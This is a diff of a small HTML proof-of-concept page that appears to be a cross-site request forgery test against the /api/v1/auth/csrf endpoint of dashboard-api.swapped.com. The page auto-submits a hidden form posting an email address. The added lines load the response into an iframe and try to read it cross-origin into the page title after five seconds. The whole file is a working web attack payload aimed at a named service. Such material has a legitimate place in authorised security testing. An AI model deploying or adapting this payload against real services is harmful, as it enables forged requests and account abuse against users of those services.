@@ -1,8 +1,16 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-M3</title></head>
+<html><head><meta charset="utf-8"><title>ATK-M4</title></head>
 <body>
-<form id="f" method="POST" action="https://dashboard-api.swapped.com/api/v1/auth/csrf" enctype="multipart/form-data">
+<iframe name="rf" id="rf" style="width:600px;height:200px;border:1px solid #ccc;"></iframe>
+<form id="f" method="POST" action="https://dashboard-api.swapped.com/api/v1/auth/csrf" enctype="multipart/form-data" target="rf">
 <input type="hidden" name="email" value="poc@test.com">
 </form>
-<script>document.getElementById('f').submit();</script>
+<script>
+document.getElementById('f').submit();
+setTimeout(() => {
+  try {
+    document.title = "ATK-M4-" + (document.getElementById('rf').contentDocument?.body?.innerText?.slice(0,100) || "no-content");
+  } catch(e) { document.title = "ATK-M4-CROSS"; }
+}, 5000);
+</script>
 </body></html>
